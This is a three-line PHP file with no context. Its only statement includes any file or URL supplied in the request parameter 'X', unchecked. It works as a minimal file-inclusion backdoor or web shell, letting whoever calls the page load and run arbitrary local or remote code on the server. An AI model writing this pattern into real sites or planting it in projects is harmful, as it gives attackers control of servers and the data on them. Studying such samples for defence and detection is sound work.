<?php
include($_GET["X"]);
?>
